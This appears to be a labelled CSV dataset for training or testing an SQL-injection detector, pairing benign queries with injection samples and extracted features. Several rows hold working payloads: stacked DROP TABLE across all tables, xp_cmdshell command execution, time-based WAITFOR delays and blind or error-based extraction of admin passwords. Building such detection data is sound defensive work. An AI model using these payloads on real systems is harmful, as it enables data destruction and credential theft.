query,label,length,num_keywords,has_comment,num_quotes,num_semicolons,has_union,has_exec,has_sleep,injection_type
SELECT * FROM customers WHERE email = 'bob' AND password = '2409'; --'; EXEC sp_MSForEachTable 'DROP TABLE ?';,injection,110,6,True,7,3,False,True,False,data manipulation
SELECT COUNT(*) FROM orders WHERE product_id = 45;,safe,50,3,False,0,1,False,False,False,none
UPDATE inventory SET stock = stock - 1 WHERE product_id = 13;,safe,61,2,False,0,1,False,False,False,none
DELETE FROM temp_data WHERE created_at < NOW() - INTERVAL '7 days';,safe,67,3,False,2,1,False,False,False,none
SELECT * FROM employees WHERE department = 'support' OR EXISTS(SELECT * FROM admin);,injection,84,7,False,2,1,False,False,False,subquery
SELECT * FROM orders WHERE user_id = 9 AND status = 'shipped' OR '' = '';,injection,73,5,False,6,1,False,False,False,other
SELECT * FROM customers WHERE email = 'carol' AND password = '4109'; --'; EXEC sp_MSForEachTable 'DROP TABLE ?';,injection,112,6,True,7,3,False,True,False,data manipulation
"SELECT * FROM accounts WHERE account_name = '' OR 1=CONVERT(INT, (SELECT password FROM users WHERE username = 'admin')); --",injection,123,7,True,4,1,False,False,False,other
UPDATE inventory SET stock = stock - 1 WHERE product_id = 17;,safe,61,2,False,0,1,False,False,False,none
"INSERT INTO logs (event, user_id) VALUES ('login', 50);",safe,55,1,False,2,1,False,False,False,none
SELECT * FROM products WHERE id = 20;,safe,37,3,False,0,1,False,False,False,none
SELECT * FROM users WHERE username = 'admin' AND password = '6765';,safe,67,4,False,4,1,False,False,False,none
SELECT * FROM employees WHERE department = 'marketing' OR EXISTS(SELECT * FROM admin);,injection,86,7,False,2,1,False,False,False,subquery
SELECT * FROM employees WHERE department = 'sales';,safe,51,3,False,2,1,False,False,False,none
SELECT * FROM users WHERE username = 'alice' AND password = '4649' OR 'x'='x';,injection,78,5,False,8,1,False,False,False,other
SELECT email FROM customers WHERE customer_id = 23;,safe,51,3,False,0,1,False,False,False,none
"SELECT * FROM payments WHERE card_number = '1234' OR ASCII(SUBSTRING((SELECT TOP 1 password FROM users),1,1)) > 64; --",injection,118,6,True,2,1,False,False,False,other
SELECT * FROM login WHERE username = 'carol' AND password = ''; EXEC xp_cmdshell('dir'); --,injection,91,5,True,6,2,False,True,False,code execution
"SELECT * FROM accounts WHERE account_name = '' OR 1=CONVERT(INT, (SELECT password FROM users WHERE username = 'admin')); --",injection,123,7,True,4,1,False,False,False,other
SELECT * FROM sessions WHERE session_id = 'alice'; WAITFOR DELAY '00:00:05'; --,injection,79,4,True,4,2,False,False,True,time-based
"SELECT * FROM payments WHERE card_number = '1234' OR ASCII(SUBSTRING((SELECT TOP 1 password FROM users),1,1)) > 64; --",injection,118,6,True,2,1,False,False,False,other
SELECT * FROM login WHERE username = 'admin' AND password = ''; EXEC xp_cmdshell('dir'); --,injection,91,5,True,6,2,False,True,False,code execution
SELECT email FROM customers WHERE customer_id = 28;,safe,51,3,False,0,1,False,False,False,none
SELECT * FROM logs WHERE action = 'login' AND user_id = 49 OR (SELECT COUNT(*) FROM users) > 0; --,injection,98,7,True,2,1,False,False,False,other
"INSERT INTO logs (event, user_id) VALUES ('login', 16);",safe,55,1,False,2,1,False,False,False,none
